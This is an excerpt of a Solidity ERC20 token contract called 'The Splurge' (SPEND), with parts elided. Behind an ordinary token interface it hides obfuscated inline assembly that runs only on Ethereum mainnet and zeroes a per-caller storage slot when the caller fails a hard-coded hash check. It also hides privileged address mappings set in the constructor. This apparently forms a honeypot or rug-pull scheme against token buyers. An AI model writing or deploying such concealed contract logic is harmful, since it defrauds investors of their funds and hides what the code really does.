/*
SPEND \|/ ETH
Time to splurge some money into the economy.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private _splurger = block.number*2;

    mapping (address => bool) private _moreFirsts; 
    mapping (address => bool) private _moreSeconds;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private endHope;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private lightTree;
    address public pair;
    ...
    bool private trading; uint256 private slowMoney = 1; bool private rapidAscent;
    uint256 private _decimals; uint256 private fastTalk;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        for (uint256 q=0; q < 3;) {_moreFirsts[spendAdd[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenStarter() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xdb1ee2d39238adb24f69b33f06a7d7f58327c0f00d07cc70d10cf72afe643a93
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x683a19347ff20e7b13c1baca665423542dbf2f19b286acf63d3567ea97c3cef5,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _splurger = block.number;
        return true;
    }
    ...
    function _DeploySpend(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySpend(creator, initialSupply);
    }
}

contract SpendSplurge is ERC20Token {
    constructor() ERC20Token("The Splurge", "SPEND", msg.sender, 1250000 * 10 ** 18) {
    }
}